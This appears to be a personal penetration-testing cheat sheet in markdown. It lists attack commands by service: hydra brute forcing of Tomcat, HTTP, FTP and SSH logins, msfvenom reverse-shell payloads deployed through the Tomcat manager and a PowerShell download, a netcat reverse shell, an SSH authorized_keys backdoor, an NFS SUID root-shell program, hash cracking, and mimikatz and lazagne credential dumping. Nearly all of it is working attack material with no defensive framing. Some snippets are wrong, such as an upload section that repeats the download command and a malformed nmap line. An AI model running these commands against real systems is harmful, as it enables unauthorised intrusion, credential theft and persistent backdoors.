---
title: 'Pentesting CheatSheet'

layout: null
---

# Enumeration

## NMAP

- TCP

```bash
sudo -sS -sC -sV -oA <NAME>.tcp <IP> -v
```

- UDP

```bash
sudo -sU -sS -sC -sV -oA <NAME>.udp <IP> -v
```

## HTTP/HTTPS 80/433
- Directory bruteforcing

```bash
#option 1 
dirbuster 

#option 2 
gobuster -u <URL> -w <wordlist>
```

- Wordpress

`Enumerating for users`
```bash
wpscan --url <URL> --enumerate u 
```

`Cracking the password of a known user`
```bash
wpscan –url <url> –passwords rockyou.txt –usernames <username> –max-threads 50
```

- Tomcat

`Finding out username and passowrd`
```bash
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
```

- Tomcat Panel Remote Code Execution

```bash
# Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# Upload payload
Tomcat6 :
wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -

Tomcat7 and above :
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'

# Listener
nc -lvp <PORT>

# Execute payload
curl http://<IP>:8080/shell/
```

- HTTP bruteforce basic authentication 

`Attacking http-get/http-post login page `
```bash
hydra -l <USER> -V -P <PASSWORDS_LIST> -s 80 -f <IP> http-get /<URL_ENDPOINT>/ -t 15
```

- HTTP GET request 

```bash
hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form  "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
```

- HTTP POST request

```bash
hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>
```

- ffuf

```bash
ffuf -u ‘http://<ip_address>/path/to_file.php?FUZZ=/etc/passwd’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0
```

- Uploading files using curl

```bash
#Do this to check if you can upload files
curl -u "username:password" -X PUT http://10.10.10.10/path/to/directory/listing

#If it worked upload a reverse shell using CADAVER
cadaver <url>/uploads/
Username:
password:
PUT php-reverse-shell.php
```

- Nikto Vulnerability Scanning

```bash
nikto -h <url>
```


## FTP 21

- BruteForcing
 
```bash
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
```
- Downloading a file
   
```bash
# Downloading a file 
ftp <IP>
passive 
binary
get <File> 
```
- Uploading a file

```bash
# Uploading a file 
ftp <IP>
passive 
binary
get <File> 
```

## SSH 22

- Brute Forcing 

```bash
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

```bash
nmap -p 22 --script ssh-brute --script-args userdb=<users.txt> <target_IP>
```

```bash
#using msfconsole

use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target ip>
set USERPASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set verbose true
exploit
```

- Backdoor - POST EXPLOITATION

```bash
#Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
 ```
 
## DNS 53

```bash
dnsenum <DOMAIN>
```
```bash
dnsrecon -d <DOMAIN>
```

## SMB 445

```bash
smbclient -L <IP>
```
- Manual testing

```bash
smbmap -H <IP>
```

```bash
enum4linux -a <IP>
```

- Finding SMB version

```bash
msf> use auxiliary/scanner/smb/smb_version
msf> options
msf> set rhosts <target_ip>
msf> run
```

# Password cracking 

- Linux password cracking 

```bash
hashcat -m 1800 -a 0 hash.txt rockyou.txt
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

- Windows password cracking

```bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

- John the ripper

```bash
john --wordlist=<PASSWORDS_LIST> hash.txt
```

# privilege escalation

### Linux privilege escalation
- Automated scripts

```bash
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
```

- spawning interactive shell and setting env

```bash
python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
echo $TERM  
stty -a  
stty raw -echo  
fg  

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
export TERM=xterm256-color  
export SHELL=bash  

stty rows \<> colums \<>  
```

- restricted bash 

```bash
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux  
```

- check what can be run as sudo 

```bash
sudo -l
```

- Check OS and kernel 

```bash
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat base

cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

- check environment variables 

```bash
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set

# Is there a printer 
lpstat -a
```

- check any restrictions on folders

```bash
mount -l >> any no exec or no suid?  

Check any unmounted drives  
cat /etc/fstab
```

- Running applications and services

```bash
ps aux
ps -ef
top
cat /etc/services

ps aux | grep root
ps -ef | grep root
```

- Find SUID

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

- Find capabilities

```bash
getcap -r / 2>/dev/null
```

- Find Crontab

```bash
cat /etc/crontab
```

- Find NFS

```bash
#NFS are stored in here
cat /etc/exports

#enumerating mountable shares of victim
showmount -e <IP>

#mount one of the no_root_squash shares to attacking machine
mkdir /tmp/anynameyouwant
mount -o rw <IP>:/nameofshare /tmp/anynameyouwant

#after that we create nfs.c using nano in attacker machine 
int main(){
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
#now we compile the c file 
gcc nfs.c -o nfs -w

#add S=SUID permission
chmod +s nfs 

# GO TO VICTIM MACHINE AND NAVIGATE TO SHARE AND EXECUTE THE PROGRAM 
```

- TMUX 

```bash
ps aux | grep tmux #To find the tmux folder where sessions are stored in
export $TERM = xterm #stabilizing the shell 
tmux -S attach <name_of_session> #Make sure you are in the same directory where the session is stored in
```

### Windows privelege escalation

- automated scripts

```bash
winPEAS.exe
windows-privesc-check2.exe
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
```

- POST exploitation 

```bash
lazagne.exe all
SharpWeb.exe
mimikatz.exe
```

- Getting a shell

```bash
# Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <PORT>

# Victim
cd C:\Program Files\Autorun Program\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
```


**useful links**
1. https://www.revshells.com/
2. https://gtfobins.github.io/
3. https://pentest.ws/
4. https://www.exploit-db.com/
5. https://github.com/swisskyrepo/PayloadsAllTheThings
6. https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.htmlhttps://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
  
  
`Go to prose.io to Edit this cheatsheet`
